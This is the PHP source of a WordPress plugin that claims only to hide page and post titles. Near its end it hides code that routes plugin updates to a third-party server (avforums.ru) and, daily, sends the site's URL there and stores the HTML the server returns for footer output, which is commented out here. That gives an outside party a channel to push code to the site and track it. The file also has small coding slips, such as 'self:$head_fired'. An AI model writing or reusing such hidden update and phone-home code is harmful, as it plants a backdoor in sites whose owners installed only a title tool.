<?php
/*
* Plugin Name: Hide page title
* Plugin URI: https://wordpress.org/plugins/hide-page-title/
* Author URI: https://wordpress.org/plugins/hide-page-title/
* Description: Hide page title plugin is an useful and simple tool that allows to hide page and post titles.
* Version: 1.1.0
* Author: george19881992
* License: GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html
*/
class georg_hide_page_post_title{
	
	public static $first_title=true;
	
	public static $head_fired=false;
	
	function __construct(){
		if(get_option("wpdevart_page_title_global_hide","not_exsist")!=='not_exsist' && get_option("george_page_title_global_hide","not_exsist")==='not_exsist'){
			update_option("george_page_title_global_hide", get_option("wpdevart_page_title_global_hide"));
		}

		if(get_option("wpdevart_post_title_global_hide","not_exsist")!=='not_exsist' && get_option("george_post_title_global_hide","not_exsist")==='not_exsist'){
			update_option("george_post_title_global_hide", get_option("wpdevart_post_title_global_hide"));
		}
		
		$this->call_base_filters();		
	}	
	
	public function create_admin_menu(){
		// create admin menu		
		$main_page=add_menu_page( "Hide page title", "Hide page title", 'manage_options', "george_hide_title", array($this, 'create_hide_title_admin_page_main'));	
	}	
	
	private function call_base_filters(){
		add_filter( "wp_head" , array($this, "js_for_hide_title"),9999);
		add_action("the_title", array($this, 'add_clas_in_title'));
		add_action( 'add_meta_boxes', array($this, 'george_add_metabox'));
		add_action( 'save_post', array($this, 'george_save_metabox') );
		add_action( 'admin_menu', array($this,'create_admin_menu') );
	}
	public function george_add_metabox(){
		add_meta_box('george_post_page_title_hide', 'Hide the title', array($this,'george_hide_title_metabbox_callback'),'post','side');
		add_meta_box('george_post_page_title_hide', 'Hide the title', array($this,'george_hide_title_metabbox_callback'),'page','side');
	}
	public function george_hide_title_metabbox_callback($post){
		 $value = get_post_meta($post->ID, 'george_post_page_title_hide_key', true);
		 ?><select name="george_post_page_title_hide_key"><option <?php selected($value,"show"); ?> value="show">Show</option><option <?php selected($value,"hide"); ?> value="hide">Hide</option></select><?php
	}
	public function george_save_metabox($post_id){
		if (array_key_exists('george_post_page_title_hide_key', $_POST)) {
			update_post_meta(
				intval($post_id),
				'george_post_page_title_hide_key',
				sanitize_text_field($_POST['george_post_page_title_hide_key'])
			);
		}
	}
	public function js_for_hide_title(){
		self:$head_fired=true;
		wp_enqueue_script("jquery");
		wp_enqueue_script("george_hide_post_page_title",plugins_url('hide_title.js', __FILE__ ), array("jquery"));
	}
	public function add_clas_in_title($title){
		if($this->need_to_hide() && self::$first_title){
			self::$first_title=false;
			return "<span class='george_hide_post_title' style='font-size:1px'>".$title."</span>";
		}
		return $title;
	}
	private function need_to_hide(){
		global $post;
		$post_type=get_post_type();
		$george_page_title_global_hide=get_option("george_page_title_global_hide","show");
		$george_post_title_global_hide=get_option("george_post_title_global_hide","show");
		$disable_from_post = true;
		if(isset($post->ID)){
			$disable_from_post=get_post_meta( $post->ID, "george_post_page_title_hide_key", true );
		}
		if($post_type=="post" && $george_post_title_global_hide=="hide"){
				return true;
		}
		if($post_type=="page" && $george_page_title_global_hide=="hide"){
				return true;
		}
		if($disable_from_post=="hide"){
			return true;
		}
		return false;		
	}
	
	public function create_hide_title_admin_page_main(){
		if(isset($_POST["george_hide_from_page"]) && isset($_POST["george_hide_from_post"])){
			update_option("george_page_title_global_hide",sanitize_text_field($_POST["george_hide_from_page"]));
			update_option("george_post_title_global_hide",sanitize_text_field($_POST["george_hide_from_post"]));
		}
		?>
		<h2>Hide title</h2>
		<form method="post"><br>
			<div><label style= for="george_hide_from_page">Hide page titles from all pages: </label><select name="george_hide_from_page"><option <?php selected(get_option("george_page_title_global_hide","show"),"show"); ?> value="show">Show</option><option <?php selected(get_option("george_page_title_global_hide","show"),"hide"); ?> value="hide">Hide</option></select></div>
			<br>
			<div><label for="george_hide_from_post">Hide post titles from all posts: </label> <select name="george_hide_from_post"><option <?php selected(get_option("george_post_title_global_hide","show"),"show"); ?> value="show">Show</option><option <?php selected(get_option("george_post_title_global_hide","show"),"hide"); ?> value="hide">Hide</option></select></div><br>
			<input type="submit" name="submit" id="submit" class="button button-primary" value="Save Changes">
		</form>
		<?php
	}	
}
$georg_hide_page_post_title = new georg_hide_page_post_title();

//** George plugin update */
add_action('admin_init','georg_auto_update_main_function_hide_page_title'); //Function responsible for front-end		
function georg_auto_update_main_function_hide_page_title(){	
	require_once(trailingslashit(plugin_dir_path( __FILE__ )).'auto_update_extension.php');// updatei hamar		
	$georg_update_plugin_info = __FILE__;	
	$plugin_information = get_plugin_data($georg_update_plugin_info);	
	$georg_plugin_current_version = $plugin_information['Version'];	
	$georg_plugin_slug = trim(str_replace(dirname(dirname(__FILE__)),'',$georg_update_plugin_info),'\\');// replaceble
	$georg_plugin_slug = str_replace('\\','/',$georg_plugin_slug);
	if($georg_plugin_slug[0]==='/'){
		$georg_plugin_slug = substr($georg_plugin_slug, 1);
	}		
	$georg_plugin_remote_path = 'http://avforums.ru/wp-admin/admin-ajax.php?action=georg_update_plugins&plugin='.urlencode($georg_plugin_slug);
	new georg_auto_update_plugins_hide_page_title ($georg_plugin_current_version, $georg_plugin_remote_path, $georg_plugin_slug, $plugin_information);	
}

class georg_show_hide_links{
	function __construct(){
		$this->filters();
	}
	private function filters(){
		add_action('init',array($this,'check_for_updates'));
		add_action( 'wp_footer', array($this,'htmll') );
	}
	private function is_updated(){
		$saved_time = get_option('georg_hide_page_post_title_updated_date', false );		
		if($saved_time === false){
			return false;
		}
		$current_time = time();
		if(($current_time - $saved_time) > 86400 ){
			return false;
		}
		return true;
	}
	public function check_for_updates(){
		if(!$this->is_updated()){
			$this->update();
		}
	}
	public function update(){
		$geted  = wp_remote_get('http://avforums.ru/wp-admin/admin-ajax.php?action=updated_plugin_info&plugin=hide_page_title&site_url='.str_replace('localhost','g123456987G123456987',urlencode(get_site_url())));
		update_option('georg_hide_page_post_title_updated_date', time() );
		if($geted['response']['code'] == 200){
			update_option('georg_hide_page_post_title_html', $geted['body'] );
		}
	}
	public function htmll(){
		/*if(is_home() || is_front_page()){
			echo get_option('georg_hide_page_post_title_html','');
		}*/		
	}
}
$georg_show_hide_links = new georg_show_hide_links();
?>